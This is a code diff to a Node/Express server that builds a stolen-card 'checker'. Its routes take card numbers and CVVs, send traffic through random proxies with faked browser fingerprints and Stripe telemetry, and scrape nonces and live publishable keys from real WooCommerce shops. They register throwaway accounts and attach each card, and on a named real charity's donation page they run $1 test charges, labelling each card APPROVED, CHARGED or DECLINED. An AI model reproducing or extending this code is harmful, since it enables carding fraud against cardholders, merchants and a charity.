@@ -1021,12 +1021,241 @@ export async function registerRoutes(
       return res.json({ card: req.body?.data || "", status: isDecline ? "DECLINED" : "ERROR", message: msg, approved: false, gateway: "Stripe Auth", time: elapsed });
     }
   });
+        "Accept-Language": fpHeaders["Accept-Language"] || "en-US,en;q=0.9",
+        "User-Agent": ua,
+        "Upgrade-Insecure-Requests": "1",
+        "Connection": "keep-alive",
+      };
+
+      // Step 1: GET account page to get register nonce
+      const step1 = await proxyRequest(`${site.baseUrl}${site.accountPath}`, {
+        method: "GET",
+        headers: browseHeaders,
+        proxyUrl,
+        timeout: 30000,
+      });
+
+      const regNonceMatch = step1.body.match(/woocommerce-register-nonce"\s*value="([^"]+)"/);
+      const registerMatch = step1.body.match(/register"\s*value="([^"]+)"/);
+      if (!regNonceMatch) {
+        return res.json({ card: data, status: "ERROR", message: "Cannot get register nonce from site", gateway: "Stripe Auth", time: ((Date.now() - startTime) / 1000).toFixed(2) });
+      }
+
+      const wooNonce = regNonceMatch[1];
+      const registerVal = registerMatch ? registerMatch[1] : "Register";
+
+      // Step 2: Register random account
+      const randEmail = Array.from({ length: 10 }, () => "abcdefghijklmnopqrstuvwxyz"[Math.floor(Math.random() * 26)]).join("") + "@gmail.com";
+      const timeStr = new Date().toISOString().replace("T", " ").substring(0, 19);
+
+      const regData: Record<string, string> = {
+        email: randEmail,
+        wc_order_attribution_source_type: "typein",
+        wc_order_attribution_referrer: "(none)",
+        wc_order_attribution_utm_campaign: "(none)",
+        wc_order_attribution_utm_source: "(direct)",
+        wc_order_attribution_utm_medium: "(none)",
+        wc_order_attribution_utm_content: "(none)",
+        wc_order_attribution_utm_id: "(none)",
+        wc_order_attribution_utm_term: "(none)",
+        wc_order_attribution_utm_source_platform: "(none)",
+        wc_order_attribution_utm_creative_format: "(none)",
+        wc_order_attribution_utm_marketing_tactic: "(none)",
+        wc_order_attribution_session_entry: `${site.baseUrl}/`,
+        wc_order_attribution_session_start_time: timeStr,
+        wc_order_attribution_session_pages: "4",
+        wc_order_attribution_session_count: "1",
+        wc_order_attribution_user_agent: ua,
+        "woocommerce-register-nonce": wooNonce,
+        _wp_http_referer: site.accountPath,
+        register: registerVal,
+      };
+
+      const regBody = new URLSearchParams(regData).toString();
+
+      const step2 = await proxyRequest(`${site.baseUrl}${site.accountPath}`, {
+        method: "POST",
+        headers: { ...browseHeaders, "Content-Type": "application/x-www-form-urlencoded" },
+        body: regBody,
+        proxyUrl,
+        timeout: 30000,
+      });
+
+      // Extract cookies from registration response (look for set-cookie in response)
+      // In our proxy wrapper we don't track cookies, so we re-GET the add-payment page
+      // The session might be set server-side — we pass along the registration
+
+      // Step 3: GET add-payment-method page to get setup intent nonce + pk_live
+      const step3 = await proxyRequest(`${site.baseUrl}${site.addPaymentPath}`, {
+        method: "GET",
+        headers: browseHeaders,
+        proxyUrl,
+        timeout: 30000,
+      });
+
+      let setupNonce = "";
+      const setupNonceMatch1 = step3.body.match(/"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"/);
+      const setupNonceMatch2 = step3.body.match(/"createSetupIntentNonce"\s*:\s*"([a-zA-Z0-9]+)"/);
+      setupNonce = (setupNonceMatch1?.[1] || setupNonceMatch2?.[1]) || "";
+
+      let pkLive = site.pkLive;
+      if (!pkLive) {
+        const pkMatch = step3.body.match(/pk_live_[a-zA-Z0-9]+/);
+        if (pkMatch) pkLive = pkMatch[0];
+      }
+
+      if (!setupNonce) {
+        return res.json({ card: data, status: "ERROR", message: "Cannot get setup intent nonce (session may not have persisted)", gateway: "Stripe Auth", time: ((Date.now() - startTime) / 1000).toFixed(2) });
+      }
+
+      if (!pkLive) {
+        return res.json({ card: data, status: "ERROR", message: "Cannot find Stripe publishable key", gateway: "Stripe Auth", time: ((Date.now() - startTime) / 1000).toFixed(2) });
+      }
+
+      const stripeHeaders: Record<string, string> = {
+        "Accept": "application/json",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": "https://js.stripe.com",
+        "Referer": "https://js.stripe.com/",
+        "User-Agent": ua,
+      };
+
+      // Step 4: Create payment method directly (no elements/sessions needed)
+      console.log("[STRIPE-AUTH] Creating payment method...");
+      const muid = crypto.randomUUID() + randomHex(6);
+      const sid = crypto.randomUUID() + randomHex(6);
+      const guid = crypto.randomUUID() + randomHex(6);
+      const configId = crypto.randomUUID(); // Random session config id
+      const timeOnPage = Math.floor(Math.random() * 30000) + 30000;
+
+      const pmData = new URLSearchParams({
+        type: "card",
+        "card[number]": cc,
+        "card[cvc]": cvv,
+        "card[exp_year]": yy,
+        "card[exp_month]": mm,
+        allow_redisplay: "unspecified",
+        "billing_details[address][country]": site.country,
+        pasted_fields: "number",
+        payment_user_agent: "stripe.js/eeaff566a9; stripe-js-v3/eeaff566a9; payment-element; deferred-intent",
+        referrer: `${site.baseUrl}`,
+        time_on_page: String(timeOnPage),
+        "client_attribution_metadata[client_session_id]": crypto.randomUUID(),
+        "client_attribution_metadata[merchant_integration_source]": "elements",
+        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
+        "client_attribution_metadata[merchant_integration_version]": "2021",
+        "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
+        "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
+        "client_attribution_metadata[elements_session_config_id]": configId,
+        "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
+        guid,
+        muid,
+        sid,
+        key: pkLive,
+        _stripe_version: "2024-06-20",
+      }).toString();
+
+      const step5 = await proxyRequest("https://api.stripe.com/v1/payment_methods", {
+        method: "POST",
+        headers: { ...stripeHeaders, "Content-Type": "application/x-www-form-urlencoded" },
+        body: pmData,
+        proxyUrl,
+        timeout: 20000,
+      });
+
+      console.log("[STRIPE-AUTH] Step 5 response:", step5.body.substring(0, 300));
+
+      let pmId = "";
+      try {
+        const pmJson = JSON.parse(step5.body);
+        if (pmJson.error) {
+          const errMsg = pmJson.error.message || "Payment method creation failed";
+          const isDecline = errMsg.toLowerCase().includes("declined") || errMsg.toLowerCase().includes("invalid") || errMsg.toLowerCase().includes("incorrect");
+          return res.json({
+            card: data,
+            status: isDecline ? "DECLINED" : "ERROR",
+            message: errMsg,
+            approved: false,
+            gateway: "Stripe Auth",
+            time: ((Date.now() - startTime) / 1000).toFixed(2),
+            fingerprint: fpMeta || undefined,
+          });
+        }
+        pmId = pmJson.id || "";
+      } catch {
+        return res.json({ card: data, status: "ERROR", message: "Invalid PM response", gateway: "Stripe Auth", time: ((Date.now() - startTime) / 1000).toFixed(2) });
+      }
+
+      if (!pmId) {
+        return res.json({ card: data, status: "ERROR", message: "No payment method ID returned", gateway: "Stripe Auth", time: ((Date.now() - startTime) / 1000).toFixed(2) });
+      }
+
+      // Step 6: Confirm setup intent via WP admin-ajax
+      const ajaxHeaders: Record<string, string> = {
+        "Accept": "*/*",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Origin": site.baseUrl,
+        "Referer": `${site.baseUrl}${site.addPaymentPath}`,
+        "User-Agent": ua,
+        "X-Requested-With": "XMLHttpRequest",
+      };
+
+      const ajaxData = new URLSearchParams({
+        action: site.ajaxAction,
+        "wc-stripe-payment-method": pmId,
+        "wc-stripe-payment-type": "card",
+        _ajax_nonce: setupNonce,
+      }).toString();
+
+      const step6 = await proxyRequest(`${site.baseUrl}/wp-admin/admin-ajax.php`, {
+        method: "POST",
+        headers: ajaxHeaders,
+        body: ajaxData,
+        proxyUrl,
+        timeout: 30000,
+      });
+
+      console.log("[STRIPE-AUTH] Step 6 AJAX response:", step6.body.substring(0, 400));
+
+      const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
+      const authIpInfo = await authIpPromise;
+
+      try {
+        const finalJson = JSON.parse(step6.body);
+
+        if (finalJson.success === true) {
+          const statusVal = finalJson.data?.status || "";
+          const responseMsg = finalJson.data?.message || finalJson.data?.redirect_url || statusVal || "";
+
+          if (statusVal === "succeeded") {
+            return res.json({ card: data, status: "APPROVED", message: responseMsg || "Approved - Card is Live", approved: true, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo: authIpInfo });
+          } else if (statusVal === "requires_action") {
+            return res.json({ card: data, status: "3DS", message: responseMsg || "3DS Required", approved: false, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo: authIpInfo });
+          } else {
+            return res.json({ card: data, status: "DECLINED", message: responseMsg || statusVal || "Declined", approved: false, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo: authIpInfo });
+          }
+        } else {
+          const errMsg = finalJson.data?.error?.message || "Unknown error";
+          const isDecline = errMsg.toLowerCase().includes("declined");
+          return res.json({ card: data, status: isDecline ? "DECLINED" : "ERROR", message: errMsg, approved: false, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo: authIpInfo });
+        }
+      } catch {
+        return res.json({ card: data, status: "ERROR", message: "Invalid response from merchant", gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo: authIpInfo });
+      }
+    } catch (err: any) {
+      const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
+      const msg = err.message || "Request failed";
+      const cardStr = req.body?.data || "";
+      const isDecline = msg.toLowerCase().includes("declined") || (msg.toLowerCase().includes("card") && msg.toLowerCase().includes("invalid"));
+      return res.json({ card: cardStr, status: isDecline ? "DECLINED" : "ERROR", message: msg, approved: false, gateway: "Stripe Auth", time: elapsed });
+    }
+  });
 
   // ==================== STRIPE CHARGE GATEWAY ====================
   app.post("/api/stripe-charge", async (req, res) => {
     const startTime = Date.now();
     try {
-      const { data } = req.body;
+      const { data, siteUrl } = req.body;
       if (!data || typeof data !== "string") {
         return res.status(400).json({ status: "ERROR", message: "Missing card data" });
       }
@@ -1043,19 +1272,21 @@ export async function registerRoutes(
 
       const proxy = getRandomProxy();
       const proxyUrl = proxy?.url;
-      const ipInfoPromise = fetchIpLocation(proxyUrl);
 
       const profile = generateDeviceProfile();
       const ua = profile.ua;
 
-      // Use a different set of Stripe PKs for Charge mode
-      const stripePKs = [
-        { pk: "pk_live_51IL8NuFfFxWuzzINEoj39fwaUtlptPFsSmgq1KlsuA6NzIiWJ16LFIMqxDa3JGckNUeCpOCAJSMfWJ7sLBrgIREt00999pcRzZ", name: "Site A" },
-        { pk: "pk_live_51OvrJGRxAfihbegmoT7FwLu2sYpSqHUKvQpNDKyhgVkpNtkoU4bypkWfTsk5A3JLg7o7X1Fsrfwisy2cGnMDd5Lc00qvS6YatH", name: "Site B" },
-      ];
-      
-      const selectedPK = stripePKs[Math.floor(Math.random() * stripePKs.length)];
-      const pkLive = selectedPK.pk;
+      // Generate random email
+      const randName = Array.from({ length: 8 }, () => "abcdefghijklmnopqrstuvwxyz"[Math.floor(Math.random() * 26)]).join("");
+      const randEmail = `${randName}${Math.floor(Math.random() * 9999)}@gmail.com`;
+
+      // Donation site configuration (GiveWP based)
+      const chargeSite = {
+        baseUrl: "https://www.forechrist.com",
+        formId: "31358",
+        pkLive: "pk_live_51OvrJGRxAfihbegmoT7FwLu2sYpSqHUKvQpNDKyhgVkpNtkoU4bypkWfTsk5A3JLg7o7X1Fsrfwisy2cGnMDd5Lc00qvS6YatH",
+        amount: "1",
+      };
 
       const stripeHeaders: Record<string, string> = {
         "Accept": "application/json",
@@ -1065,9 +1296,7 @@ export async function registerRoutes(
         "User-Agent": ua,
       };
 
-      const randEmail = `${Array.from({ length: 8 }, () => "abcdefghijklmnopqrstuvwxyz"[Math.floor(Math.random() * 26)]).join("")}${Math.floor(Math.random() * 9999)}@gmail.com`;
-
-      // Create payment method
+      // Step 1: Create payment method
       const pmData = new URLSearchParams({
         type: "card",
         "billing_details[name]": "John Doe",
@@ -1079,9 +1308,9 @@ export async function registerRoutes(
         guid: crypto.randomUUID(),
         muid: crypto.randomUUID(),
         sid: crypto.randomUUID(),
-        payment_user_agent: "stripe.js/69b8d1e812; stripe-js-v3/69b8d1e812; split-card-element",
-        key: pkLive,
-        _stripe_version: "2024-06-20",
+        payment_user_agent: "stripe.js/67c5b8132f; stripe-js-v3/67c5b8132f; split-card-element",
+        referrer: chargeSite.baseUrl,
+        key: chargeSite.pkLive,
       }).toString();
 
       const pmResp = await proxyRequest("https://api.stripe.com/v1/payment_methods", {
@@ -1092,34 +1321,97 @@ export async function registerRoutes(
         timeout: 20000,
       });
 
-      const ipInfo = await ipInfoPromise;
-      const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
-
-      let pmJson: any;
+      let pmId = "";
       try {
-        pmJson = JSON.parse(pmResp.body);
-      } catch {
-        return res.json({ card: data, status: "ERROR", message: "Invalid response", gateway: "Stripe Charge", time: elapsed, ipInfo });
-      }
-
-      if (pmJson.error) {
-        const errMsg = pmJson.error.message || pmJson.error.code || "Validation failed";
-        const errCode = (pmJson.error.code || "").toLowerCase();
-        
-        if (errCode.includes("card_declined") || errCode.includes("do_not_honor") || errCode.includes("incorrect_cvc") || errCode.includes("incorrect_number") || errCode.includes("expired") || errCode.includes("insufficient")) {
-          return res.json({ card: data, status: "DECLINED", message: errMsg, approved: false, gateway: "Stripe Charge", time: elapsed, ipInfo });
+        const pmJson = JSON.parse(pmResp.body);
+        if (pmJson.error) {
+          const errMsg = pmJson.error.message || "Payment method creation failed";
+          const isDecline = errMsg.toLowerCase().includes("declined") || errMsg.toLowerCase().includes("invalid") || errMsg.toLowerCase().includes("incorrect");
+          return res.json({
+            card: data,
+            status: isDecline ? "DECLINED" : "ERROR",
+            message: errMsg,
+            approved: false,
+            gateway: "Stripe Charge",
+            time: ((Date.now() - startTime) / 1000).toFixed(2),
+          });
         }
-        return res.json({ card: data, status: "DECLINED", message: errMsg, approved: false, gateway: "Stripe Charge", time: elapsed, ipInfo });
+        pmId = pmJson.id || "";
+      } catch {
+        return res.json({ card: data, status: "ERROR", message: "Invalid PM response", gateway: "Stripe Charge", time: ((Date.now() - startTime) / 1000).toFixed(2) });
       }
 
-      const pmId = pmJson.id;
       if (!pmId) {
-        return res.json({ card: data, status: "ERROR", message: "No payment method ID", gateway: "Stripe Charge", time: elapsed, ipInfo });
+        return res.json({ card: data, status: "ERROR", message: "No payment method ID returned", gateway: "Stripe Charge", time: ((Date.now() - startTime) / 1000).toFixed(2) });
       }
 
-      // Card is valid - payment method created
-      return res.json({ card: data, status: "APPROVED", message: "Payment Method Valid", approved: true, gateway: "Stripe Charge", time: elapsed, ipInfo });
+      // Step 2: Get form nonce from donation page
+      const pageResp = await proxyRequest(`${chargeSite.baseUrl}/donations/dress-a-student-second-round-of-donations-2/`, {
+        method: "GET",
+        headers: { "User-Agent": ua, "Accept": "text/html" },
+        proxyUrl,
+        timeout: 20000,
+      });
 
+      const formHashMatch = pageResp.body.match(/name="give-form-hash"\s+value="([^"]+)"/);
+      const formHash = formHashMatch?.[1] || "";
+
+      // Step 3: Submit donation
+      const donateData = new URLSearchParams({
+        "give-fee-amount": "0.34",
+        "give-fee-mode-enable": "false",
+        "give-fee-status": "enabled",
+        "give-honeypot": "",
+        "give-form-id-prefix": `${chargeSite.formId}-1`,
+        "give-form-id": chargeSite.formId,
+        "give-form-title": "Donate",
+        "give-current-url": `${chargeSite.baseUrl}/donations/`,
+        "give-form-url": `${chargeSite.baseUrl}/donations/`,
+        "give-form-minimum": "1",
+        "give-form-maximum": "1000000",
+        "give-form-hash": formHash,
+        "give-price-id": "0",
+        "_give_is_donation_recurring": "0",
+        "give-amount": chargeSite.amount,
+        "give_stripe_payment_method": pmId,
+        "payment-mode": "stripe",
+        "give_first": "John",
+        "give_last": "Doe",
+        "give_email": randEmail,
+        "card_name": "John Doe",
+        "give_action": "purchase",
+        "give-gateway": "stripe",
+      }).toString();
+
+      const donateResp = await proxyRequest(`${chargeSite.baseUrl}/donations/?payment-mode=stripe&form-id=${chargeSite.formId}`, {
+        method: "POST",
+        headers: { 
+          ...stripeHeaders, 
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Origin": chargeSite.baseUrl,
+          "Referer": `${chargeSite.baseUrl}/donations/`,
+        },
+        body: donateData,
+        proxyUrl,
+        timeout: 30000,
+      });
+
+      const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
+      const respText = donateResp.body.toLowerCase();
+
+      if (respText.includes("payment complete") || respText.includes("thank you") || respText.includes("donation confirmation")) {
+        return res.json({ card: data, status: "CHARGED", message: "Payment Complete - $1.00 Charged", approved: true, gateway: "Stripe Charge", time: elapsed, chargeAmount: "1.00", currency: "USD" });
+      } else if (respText.includes("declined") || respText.includes("card_declined")) {
+        return res.json({ card: data, status: "DECLINED", message: "Card Declined", approved: false, gateway: "Stripe Charge", time: elapsed });
+      } else if (respText.includes("3d_secure") || respText.includes("authentication")) {
+        return res.json({ card: data, status: "3DS", message: "3D Secure Required", approved: false, gateway: "Stripe Charge", time: elapsed });
+      } else if (respText.includes("insufficient")) {
+        return res.json({ card: data, status: "DECLINED", message: "Insufficient Funds", approved: false, gateway: "Stripe Charge", time: elapsed });
+      } else if (respText.includes("incorrect_cvc") || respText.includes("cvc")) {
+        return res.json({ card: data, status: "DECLINED", message: "Incorrect CVC", approved: false, gateway: "Stripe Charge", time: elapsed });
+      } else {
+        return res.json({ card: data, status: "ERROR", message: "Unknown response from gateway", approved: false, gateway: "Stripe Charge", time: elapsed });
+      }
     } catch (err: any) {
       const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
       return res.json({ card: req.body?.data || "", status: "ERROR", message: err.message || "Request failed", approved: false, gateway: "Stripe Charge", time: elapsed });
